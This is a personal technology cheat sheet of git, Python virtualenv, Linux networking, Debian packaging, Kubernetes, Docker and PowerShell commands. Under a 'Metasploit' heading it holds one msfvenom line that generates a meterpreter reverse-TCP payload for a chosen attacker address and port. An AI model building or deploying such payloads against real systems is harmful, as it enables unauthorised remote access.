# mycheatsheet

📑 Cheat sheet for professionals working with technology

## Topics

### Git

```
# Revert changes to modified files.
git reset --hard

# Remove all untracked files and directories.
# '-f' is force, '-d' is remove directories.
git clean -fd
```

### Python

* Pipenv

```
pipenv --python 3.7 # Create a new project using Python 3.7, specifically
pipenv --rm # Remove project virtualenv 
pipenv install --dev # Install all dependencies for a project (including dev)
pipenv lock --pre # Create a lockfile containing pre-releases
pipenv graph # Show a graph of your installed dependencies
pipenv check # Check your installed dependencies for security vulnerabilities
pipenv install -e . # Install a local setup.py into your virtual environment/Pipfile
pipenv run pip freeze # Use a lower-level pip command
```

* Use venv on Linux (Debian10)
```
sudo pip3 install virtualenv
virtualenv venv
source venv/bin/activate
deactivate
pip install -r requirements.txt
```

### Linux

* Find/ Remove

```
sudo find ./ -iname "<file-name>*" -exec rm {} \;
```

* Check if port is in use on Linux

```
cat /etc/services
grep -w '443/tcp' /etc/services
egrep -w '22/(tcp|udp)' /etc/services

sudo lsof -i -P -n | grep LISTEN
sudo netstat -tulpn | grep LISTEN
sudo lsof -i:22 ## See a specific port such as 22
sudo lsof -nP -iTCP -sTCP:LISTEN
sudo watch ss -tulpn
sudo ss -tulw
sudo ss -tulwn 
# -t : Show only TCP sockets on Linux
# -u : Display only UDP sockets on Linux
# -l : Show listening sockets. For example, TCP port 22 is opened by SSHD server.
# -p : List process name that opened sockets
# -n : Don’t resolve service names i.e. don’t use DNS
sudo nmap -sT -O localhost
sudo nmap -sU -O 192.168.2.13 # List open UDP ports
sudo nmap -sT -O 192.168.2.13 # List open TCP ports 
```

* Check and list active SSH connections in Linux

```
ss | grep -i ssh
last -a | grep -i still
who
w
netstat -tnpa | grep 'ESTABLISHED.*sshd'
ps auxwww | grep sshd: | grep -v grep
```

* dpkg/.deb

```
dpkg -l # List installed packages
dpkg -s mypkg # Get status of specific package

apt list --installed # List installed packages
apt list # List *all* packages in available repos
dpkg -b ./mypkg ./mypkg_1.0.0-0_amd64.deb
dpkg -I mypkg.deb # Inspect information 
dpkg -c mypkg.deb # Review the contents
dpkg -X mypkg.deb /tmp/exctact/ # Extract the contents
sudo apt install ./mypkg.deb # Install 
sudo dpkg -i mypkg.deb # Install
dpkg --remove package_name # Leaves config files
dpkg --purge package_name  # Removes config files too

# Structure for a package
mypkg/             # Directory
├── DEBIAN/        # Directory
│   └── control    # Control file
│   └── postinst   # Post install script
├── etc/my.ini     # Optionally any other files that you need to include
└── opt/mylib/     # on the destination system during installation

# This is a minimal example of the DEBIAN/control file:
-
Package: mypkg
Version: 1.0.0
Maintainer: Your Name <you@example.com>
Description: My test package, please ignore
Homepage: https://github.com/username/projectname
Architecture: all
Depends: git, python3 (>=3.5), openjdk-8-jre-headless|openjdk-8-jre|openjdk-8-jdk-headless|openjdk-8-jdk
-

# Convert a .deb to .rpm and other formats
sudo apt install alien
alien --help
alien --to-rpm my_pkg.deb
```

* PPA

```
sudo add-apt-repository --remove ppa:<ppa_name>/ppa
sudo ls /etc/apt/sources.list.d
sudo rm -i /etc/apt/sources.list.d/<ppa_name.list>
```
* Generate A Strong Password In Linux

```
openssl rand -base64 14 # 6iILGKjgCPc13mQo/jo=
cat /dev/urandom | tr -dc a-zA-Z0-9 | fold -w 14 | head -n 1 # xGp9LIzsaoJcZ5
< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c${1:-32};echo; # _e0EZFl48koBBqTCe4WT43jdXqq7NHQ1
tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1 # 0oZYBhvsqvJ9hPzCNg7zgskNaedXCm
strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 30 | tr -d '\n'; echo # aiZEtYlkCgBUrBdZJKMr1wovgjM4Go
< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c6 # Jzjyar
dd if=/dev/urandom bs=1 count=32 2>/dev/null | base64 -w 0 | rev | cut -b 2- | rev # z2VFL+nCKNOlmxTucy9BhehzNqS/uGmAQEvDpubJHDk
</dev/urandom tr -dc '12345!@#$%qwertQWERTasdfgASDFGzxcvbZXCVB' | head -c8; echo "" # xT%eV1WR

sudo apt install pwgen
pwgen 14 1 # AhchohNukoop8X

```

* FTP upload 

```
curl -T my-local-file.txt ftp://ftp.example.com --user user:secret
ftp-upload -h {HOST} -u {USERNAME} --password {PASSWORD} -d {SERVER_DIRECTORY} {FILE_TO_UPLOAD}
```


### Git(github/gitlab)

```
git config --global user.name "Sam Smith"
git config --global user.email sam@example.com

git init
git add README.md
git commit -m "first commit"
git remote add origin https:/<URL>
git push -u origin master

ssh -vT git@github.com
git remote -v
git remote set-url --add origin  https://<URL>

git checkout -b <branchname>
git branch -d <branchname>
git merge <branchname>
git diff <sourcebranch> <targetbranch>
git tag 1.0.0 <commitID>
git log
git reset --hard origin/master

# Undo changes without confirming anything yet
git checkout -- . # Reverse all changes to files that were versioned
git clean -f -d # Delete all created files and directories
git reset HEAD . # If you add files to the index (using git add)

git config --global http.proxy http://proxyUsername:proxyPassword@proxy.server.com:port
```


### Kubernetes 

* Metric spoon

```
kubectl top pod
kubectl top node

kubectl get --raw=/apis/metrics.k8s.io/v1beta1/nodes | jq # All nodes in the cluster
kubectl get --raw=/apis/metrics.k8s.io/v1beta1/nodes/<NODE> # A specific node
kubectl get --raw=/apis/metrics.k8s.io/v1beta1/pods  # All pods in the cluster
kubectl get --raw=/apis/metrics.k8s.io/v1beta1/namespaces/<namespace>/pods # All pods in a specific namespace
kubectl get --raw=/apis/metrics.k8s.io/v1beta1/namespaces/<namespace>/pods/<pod> # A specific pod

kubectl get nodes --no-headers | awk '{print $1}' | xargs -I {} sh -c 'echo {}; kubectl describe node {} | grep Allocated -A 5 | grep -ve Event -ve Allocated -ve percent -ve -- ; echo'

```

* kubectl

```
kubectl config view 
kubectl config set-context --current --namespace=<namespace>
kubectl config get-contexts # Display list of contexts
kubectl apply -f ./my-manifest.yaml # Create resource(s)
kubectl logs <pod>
kubectl exec <pod> -- ls / # Run command in existing pod (1 container case)
kubectl top pod <pod> # Show metrics for a given pod and its containers
kubectl create deployment nginx --image=nginx # Start a single instance of nginx
kubectl get pods --all-namespaces # List all pods in all namespaces
kubectl get services # List all services in the namespace
kubectl get pod <pod> -o yaml # Get a pod's YAML
kubectl describe pods <pod> # Describe commands with verbose output
kubectl get pods --show-labels # Show labels for all pods 
kubectl delete -f ./pod.json # Delete a pod using the type and name specified in pod.json
kubectl get pod -o=custom-columns=NODE:.spec.nodeName,NAME:.metadata.name --all-namespaces # PodxNode
kubectl get pod -o=custom-columns=NODE:.spec.nodeName,NAME:.metadata.name --all-namespaces | grep <node-name>

```

### Docker

* Most used situations

```
kubectl port-forward kong-kong-<xxx> 8444:8444

docker run -d --name konga --network host -p 1337:1337 pantsel/konga
docker run -d --hostname my-rabbit --name rabbitlocal -p 8080:15672 -p 5672:5672 -p 25676:25676 rabbitmq:3-management
docker exec -it <container_id_or_name> echo "Hello from container!"
```


### Metasploit

```
sudo msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o <file_name>
```

### Windows

* Powershell

```
(get-date) - (gcim Win32_OperatingSystem).LastBootUpTime # uptime
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize # List of Your Installed Programs on Windows

```
